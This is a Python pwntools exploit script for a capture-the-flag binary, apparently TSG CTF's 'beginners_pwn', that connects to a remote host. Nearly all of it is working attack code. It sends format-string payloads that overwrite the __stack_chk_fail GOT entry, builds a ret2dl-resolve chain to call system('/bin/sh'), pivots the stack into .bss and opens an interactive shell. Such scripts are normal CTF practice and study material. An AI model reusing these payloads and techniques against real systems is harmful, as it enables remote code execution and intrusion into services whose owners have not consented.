from pwn import *
from roputils import ROP as R_ROP
context.arch = 'amd64'
context.log_level = 'debug'

program = '/home/xpj/ctf/tsg_ctg/beginners_pwn_b'
elf = ELF(program)

def syscall(rax, rdi, rsi, rdx, rcx):
    syscall = 0x000000000040118F
    pop_rdi = 0x00000000004012c3

    sys_execve = 59
    #
    return p64(pop_rdi)


# r = remote('127.0.0.1', 3001 )
r = remote('35.221.81.216', 30002 )
# r = process(program)
# gdb.attach(r, '''
# b *0x000000000401237
# ''')
# raw_input('send format string 1')
payload = '%1$s%7$s' + p64(elf.got['__stack_chk_fail']) + 'a'*8
r.send(payload)
# raw_input('send format data 1')
r.sendline('aaaaaaa')
r.sendline(p64(0x401060)+p64(0x0000000000401046))
# r.sendline(p64(elf.sym['main']))

raw_input('send format string 2')

payload = '%1$s%7$s' + p64(elf.bss()) + 'a'*8
r.send(payload)
# raw_input('send format data 2')
r.sendline('a'*0x8)

rop = R_ROP(program)
addr_stage = rop.section('.bss') + 0x20
addr_bss = rop.section('.bss')
buf2 = '/bin/sh\0'
buf2 += rop.fill(0x20, buf2)
buf2 += rop.dl_resolve_data(addr_stage, 'system')
buf2 += rop.fill(0x100, buf2)

buf3 = rop.dl_resolve_call(addr_bss+0x20)
r.sendline(buf2)
# r.sendline('bbbb')


raw_input('send format string 3')

payload = '%8$s%[^\x0b]1$saaaa' + p64(elf.got['__stack_chk_fail'])
r.send(payload)
# raw_input('send format data 2')
rop = ROP(program)
rop.migrate(elf.bss())
print rop.dump()
# 0x00000000004012bc : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
r.sendline(p64(0x00000000004012bc))
# r.sendline('c'*0x1 + rop.chain())
pop_rdi = 0x00000000004012c3
r.send(p64(pop_rdi) + p64(addr_bss) + p64(0x401020) + p64(0x027e)+'\x0b')

r.interactive()

